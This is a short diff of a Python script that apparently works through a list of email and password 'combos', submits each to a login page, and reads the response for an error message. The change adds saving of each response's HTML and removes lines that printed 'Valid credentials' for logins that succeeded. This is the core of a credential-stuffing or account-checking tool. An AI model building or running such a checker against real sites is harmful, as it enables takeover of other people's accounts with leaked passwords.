@@ -76,19 +76,18 @@ for combo in combos:
     # Get the response HTML
     html_content = response.text
     
+    # Save response HTML to file
+    with open(f'response_{email.replace("@", "_at_")}.html', 'w', encoding='utf-8') as f:
+        f.write(html_content)
+    print(f"Response saved to: response_{email.replace('@', '_at_')}.html")
+    
     # Split into lines
     lines = html_content.split('\n')
     
     # Find the line with "fa fa-exclamation-circle" and print only the 2nd line after it
-    error_found = False
     for i, line in enumerate(lines):
         if 'fa fa-exclamation-circle' in line:
-            error_found = True
             if i + 2 < len(lines):
                 error_msg = lines[i+2].strip()
                 print(f"❌ FAILED: {error_msg}")
             break
-    
-    if not error_found:
-        print(f"✅ SUCCESS: Login appears successful!")
-        print(f"Valid credentials: {email}:{password}")
